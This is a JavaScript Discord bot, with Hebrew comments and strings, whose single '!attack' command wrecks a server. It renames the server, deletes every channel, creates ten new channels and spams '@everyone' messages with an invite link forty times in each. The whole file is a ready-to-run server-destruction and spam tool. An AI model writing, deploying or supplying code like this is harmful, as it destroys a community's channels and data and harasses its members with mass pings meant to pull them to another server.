const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function main() {
    const config = await loadConfig();
    
    // משיכת הטוקן בצורה סודית מהאתר רנדר
    const botToken = config.token === "PROCESS_ENV_TOKEN" ? process.env.DISCORD_TOKEN : config.token;

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    client.once('ready', () => { console.log(`Logged in as ${client.user.tag}!`); });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith('!') || message.author.bot) return;
        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'attack') {
            console.log('Attack started');
            await message.guild.setName(config.newServerName).catch(console.error);
            const channels = await message.guild.channels.fetch();
            for (const channel of channels.values()) { await channel.delete().catch(console.error); }

            const newChannels = [];
            for (let i = 0; i < 10; i++) {
                const created = await message.guild.channels.create({ name: 'כנסו-עברנו-שרת', type: 0 }).catch(console.error);
                if (created) newChannels.push(created);
            }

            for (const channel of newChannels) {
                for (let i = 0; i < 40; i++) {
                    await channel.send('@everyone כנסו עברנו שרת https://discord.gg').catch(console.error);
                }
            }
        }
    });
    client.login(botToken);
}
main().catch(console.error);
